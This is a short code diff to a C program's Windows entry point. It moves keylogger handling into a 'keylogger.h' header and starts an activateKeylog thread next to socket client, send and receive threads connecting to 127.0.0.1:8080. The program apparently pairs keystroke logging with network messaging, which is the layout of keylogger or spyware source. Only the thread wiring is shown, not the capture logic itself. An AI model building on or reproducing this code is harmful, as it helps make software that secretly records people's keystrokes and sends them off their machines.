@@ -14,6 +14,7 @@
 
 #include "../common/socket.h"
 #include "../common/common.h"
+#include "keylogger.h"
 
 #define PORT 8080
 #define ADDRESS "127.0.0.1"
@@ -27,16 +28,13 @@ int main() {
 
 
 #ifdef _WIN32
-	FILE * keylog;
-	getFile(&keylog);
-
 	HANDLE cliSocket, sendMSG, getMSG, actKeylog;
 	DWORD cliSocketId, sendMSGId, getMSGId, actKeylogId;
 
 	WSADATA wsa;
 	WSAStartup(MAKEWORD(2,2), &wsa);
 
-	actKeylog = CreateThread(NULL, 0, activateKeylog, (LPVOID)&keylog, 0, &actKeylogId);
+	actKeylog = CreateThread(NULL, 0, activateKeylog, NULL, 0, &actKeylogId);
 	cliSocket = CreateThread(NULL, 0, clientSocket, (LPVOID)&param, 0, &cliSocketId);
 	sendMSG = CreateThread(NULL, 0, sendMessage, (LPVOID)&param, 0, &sendMSGId);
 	getMSG = CreateThread(NULL, 0, getMessage, (LPVOID)&param, 0, &getMSGId);
